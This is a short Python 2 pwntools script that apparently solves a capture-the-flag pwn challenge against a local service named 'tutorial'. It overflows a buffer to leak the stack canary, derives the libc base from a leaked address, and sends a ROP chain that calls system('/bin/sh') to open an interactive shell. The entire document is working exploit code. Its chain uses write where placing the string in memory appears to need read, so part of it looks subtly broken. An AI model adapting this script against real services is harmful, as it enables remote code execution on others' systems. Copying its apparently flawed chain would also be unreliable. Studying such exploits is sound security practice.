from pwn import *

p = remote("localhost", 1235)
print p.recvuntil('>')
p.sendline("2")
print p.recvuntil('>')
p.sendline("a"*311)
canary = p.recvuntil('>')[312:320]

elf = ELF('./tutorial')
libc = ELF('./libc-2.19.so')

libc_puts = libc.symbols['puts']
libc_system = libc.symbols['system']
bss = elf.bss()
read_plt = elf.plt['read']
write_plt = elf.plt['write']
binsh = "/bin/sh"

p.sendline("1")
print p.recvuntil('Reference:')
addr = int(p.recv(14)[2:], 16)

addr += 0x500

print '[+] libc system:', hex(libc_system)
base_libc = addr - libc_puts
print '[+] libc base:', hex(base_libc)
system_addr = base_libc + libc_system
print '[+] system:', hex(system_addr)

poprdiret = base_libc + 0x22b9a
poprsiret = base_libc + 0x24885
poprdxret = base_libc + 0xbcdf0

print p.recvuntil('>')
p.sendline('2')
print p.recvuntil('>')

payload = 'a'*312
payload += canary
payload += 'a'*8
payload += p64(poprdiret)
payload += p64(4)
payload += p64(poprsiret)
payload += p64(bss)
payload += p64(poprdxret)
payload += p64(len(binsh))
payload += p64(write_plt)

payload += p64(poprdiret)
payload += p64(bss)
payload += p64(system_addr)

p.sendline(payload)
p.sendline(binsh)

p.interactive()
